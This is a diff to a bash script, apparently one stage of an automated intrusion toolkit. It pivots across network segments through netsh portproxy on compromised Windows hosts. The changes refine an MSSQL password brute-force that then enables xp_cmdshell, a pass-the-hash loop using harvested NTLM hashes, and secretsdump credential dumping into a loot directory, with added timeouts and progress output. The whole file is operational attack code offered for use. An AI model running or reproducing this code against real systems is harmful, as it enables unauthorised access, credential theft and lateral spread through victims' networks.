@@ -1,10 +1,10 @@
 #!/usr/bin/env bash
 
 # 06_pivot — Lateral Movement, Network Discovery, and Cross-Segment Pivoting
-#
+
 # This script performs cyclical lateral movement with real cross-network
 # pivoting using netsh portproxy on dual-homed compromised hosts:
-#
+
 #   1. Check all compromised hosts for additional network interfaces
 #   2. Pass-the-Hash using NTLM hashes from 04_hashdump
 #   3. When PtH succeeds: hashdump, check for new NICs, pivot recursively
@@ -386,10 +386,22 @@ attack_new_segment() {
     while IFS=: read -r REMOTE_IP REMOTE_PORT; do
         [[ -z "$REMOTE_IP" || -z "$REMOTE_PORT" ]] && continue
 
-        local PROXY_PORT
-        PROXY_PORT=$(setup_portproxy "$PIVOT_HOST" "$PIVOT_REACHABLE_IP" "$REMOTE_IP" "$REMOTE_PORT")
+        # setup_portproxy echoes the port to stdout, but running in $()
+        # would lose the NEXT_PROXY_PORT increment (subshell). Instead,
+        # assign the port directly and call setup_portproxy inline.
+        local LISTEN_PORT=$NEXT_PROXY_PORT
+        NEXT_PROXY_PORT=$((NEXT_PROXY_PORT + 1))
 
-        echo "${REMOTE_IP}:${REMOTE_PORT}:${PROXY_PORT}" >> "$FORWARD_MAP"
+        echo "[*]     Setting up portproxy: ${PIVOT_HOST}:${LISTEN_PORT} -> ${REMOTE_IP}:${REMOTE_PORT}"
+
+        remote_exec "$PIVOT_HOST" \
+            "netsh interface portproxy add v4tov4 listenport=${LISTEN_PORT} listenaddress=${PIVOT_REACHABLE_IP} connectport=${REMOTE_PORT} connectaddress=${REMOTE_IP}" \
+            > /dev/null 2>&1
+
+        # Record for cleanup
+        echo "${PIVOT_HOST}|${PIVOT_REACHABLE_IP}|${LISTEN_PORT}|${REMOTE_IP}|${REMOTE_PORT}" >> "$PORTPROXY_FILE"
+
+        echo "${REMOTE_IP}:${REMOTE_PORT}:${LISTEN_PORT}" >> "$FORWARD_MAP"
     done < "$SCAN_RESULTS"
 
     # Allow portproxy rules to take effect
@@ -401,33 +413,35 @@ attack_new_segment() {
     echo ""
 
     # Phase 3: Attack through forwarded ports
+    echo ""
     echo "[*] Attacking through forwarded ports..."
+    echo "[*] NOTE: Cross-network attacks are slower due to port forwarding."
+    echo ""
 
     while IFS=: read -r REMOTE_IP REMOTE_PORT PROXY_PORT; do
         [[ -z "$PROXY_PORT" ]] && continue
 
         if [[ "$REMOTE_PORT" == "1433" ]]; then
-            echo "[*] Trying MSSQL brute-force on $REMOTE_IP via ${PIVOT_REACHABLE_IP}:${PROXY_PORT}..."
+            echo "[*] Trying MSSQL brute-force on $REMOTE_IP:$REMOTE_PORT via ${PIVOT_REACHABLE_IP}:${PROXY_PORT}..."
             local FOUND=0
+            local ATTEMPT=0
 
             while read -r USER; do
                 [[ $FOUND -eq 1 ]] && break
                 while read -r PASS; do
                     [[ -z "$USER" || -z "$PASS" ]] && continue
+                    ATTEMPT=$((ATTEMPT + 1))
+                    echo -ne "\r[*]   Attempt $ATTEMPT: $USER:$PASS ...          "
                     local RESULT
-                    RESULT=$(printf 'exit\n' | \
-                        mssqlclient "${USER}:${PASS}@${PIVOT_REACHABLE_IP}" -port "$PROXY_PORT" 2>&1)
+                    RESULT=$(timeout 15 bash -c "printf 'exit\n' | mssqlclient '${USER}:${PASS}@${PIVOT_REACHABLE_IP}' -port '$PROXY_PORT' 2>&1")
                     if echo "$RESULT" | grep -qi "SQL\|Impacket\|Press help"; then
-                        echo "[+] Credentials found: $USER:$PASS on $REMOTE_IP:$REMOTE_PORT (via proxy)"
-                        # Record with the REAL remote IP/port for the report
+                        echo -e "\r[+] Credentials found: $USER:$PASS on $REMOTE_IP:$REMOTE_PORT (via proxy)          "
                         echo "$REMOTE_IP:$REMOTE_PORT:$USER:$PASS" >> "$CREDS_FILE"
-                        # Also record the proxy mapping so cleanup knows
                         echo "$REMOTE_IP:$REMOTE_PORT:$USER:$PASS:proxy:${PIVOT_REACHABLE_IP}:${PROXY_PORT}" \
                             >> "$PIVOT_DIR/credreuse-successes.txt"
                         COMPROMISED_MAP["$REMOTE_IP"]=1
                         FOUND=1
 
-                        # Enable xp_cmdshell via the proxy
                         echo "[*]   Enabling xp_cmdshell on $REMOTE_IP (via proxy)..."
                         printf "sp_configure 'show advanced options', '1';
 RECONFIGURE;
@@ -445,48 +459,57 @@ exit
             done < "$USERS_FILE"
 
             if [[ $FOUND -eq 0 ]]; then
-                echo "[-] No credentials found on $REMOTE_IP:$REMOTE_PORT"
+                echo -e "\r[-] No credentials found on $REMOTE_IP:$REMOTE_PORT after $ATTEMPT attempts          "
             fi
         fi
 
         if [[ "$REMOTE_PORT" == "445" ]]; then
-            echo "[*] Trying PtH on $REMOTE_IP via ${PIVOT_REACHABLE_IP}:${PROXY_PORT}..."
+            echo "[*] Trying PtH on $REMOTE_IP:445 via ${PIVOT_REACHABLE_IP}:${PROXY_PORT}..."
 
             # Get all hashes we have
             local ALL_HASHES
             ALL_HASHES=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -h ":::" {} \; | sort -u)
+            local HASH_COUNT
+            HASH_COUNT=$(echo "$ALL_HASHES" | wc -l)
+            local HASH_NUM=0
+            local PTH_HIT=0
 
             while IFS= read -r HLINE; do
                 local NTHASH
                 NTHASH=$(echo "$HLINE" | cut -d: -f4)
                 [[ -z "$NTHASH" ]] && continue
+                HASH_NUM=$((HASH_NUM + 1))
+                echo -ne "\r[*]   Hash $HASH_NUM/$HASH_COUNT: ${NTHASH:0:16}...          "
 
-                # nxc can target a specific port with --port
                 local RESULT
-                RESULT=$(nxc smb "${PIVOT_REACHABLE_IP}" --port "$PROXY_PORT" \
+                RESULT=$(timeout 15 nxc smb "${PIVOT_REACHABLE_IP}" --port "$PROXY_PORT" \
                     -u "Administrator" -H "$NTHASH" --no-bruteforce 2>&1)
 
                 if echo "$RESULT" | grep -qi "Pwn3d\|STATUS_SUCCESS"; then
-                    echo "[+] PtH SUCCESS on $REMOTE_IP via proxy (hash ${NTHASH:0:16}...)"
+                    echo -e "\r[+] PtH SUCCESS on $REMOTE_IP via proxy (hash ${NTHASH:0:16}...)          "
                     if ! grep -q "^${REMOTE_IP}:" "$PIVOT_DIR/pth-successes.txt" 2>/dev/null; then
                         echo "$REMOTE_IP:Administrator:$NTHASH" >> "$PIVOT_DIR/pth-successes.txt"
                     fi
                     COMPROMISED_MAP["$REMOTE_IP"]=1
+                    PTH_HIT=1
 
-                    # Hashdump via the proxy
                     echo "[*]   Running secretsdump on $REMOTE_IP via proxy..."
                     local SAFE_REMOTE="${REMOTE_IP//./_}"
                     local REMOTE_LOOT="$LOOT_DIR/${SAFE_REMOTE}"
                     mkdir -p "$REMOTE_LOOT"
-                    # secretsdump connects to 445 directly; use the proxy mapping
-                    secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${NTHASH}" \
+                    timeout 60 secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:${NTHASH}" \
                         -target-ip "${PIVOT_REACHABLE_IP}" -port "$PROXY_PORT" \
                         "Administrator@${PIVOT_REACHABLE_IP}" 2>&1 | \
-                        tee "$REMOTE_LOOT/hashes.txt"
+                        grep -v "Exception ignored\|Traceback\|File \"/home\|KeyError\|winregistry\|secretsdump\|smbconnection\|smb3\|crypto\|Cryptodome\|ERROR_DEPENDENT" | \
+                        tee "$REMOTE_LOOT/hashes.txt" 
 
                     break
                 fi
             done <<< "$ALL_HASHES"
+
+            if [[ $PTH_HIT -eq 0 ]]; then
+                echo -e "\r[-] PtH failed on $REMOTE_IP via proxy ($HASH_NUM hashes tried)          "
+            fi
         fi
 
     done < "$FORWARD_MAP"
@@ -541,7 +564,7 @@ done
 echo ""
 echo "[*] Phase 1: Pass-the-Hash with harvested NTLM hashes"
 
-HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -h ":::" {} \; | sort -u)
+HASH_LIST=$(find "$LOOT_DIR" -name "hashes.txt" -exec grep -ah ":::" {} \; | sort -u)
 
 if [[ -z "$HASH_LIST" ]]; then
     echo "[-] No NTLM hashes found in $LOOT_DIR. Skipping PtH phase."
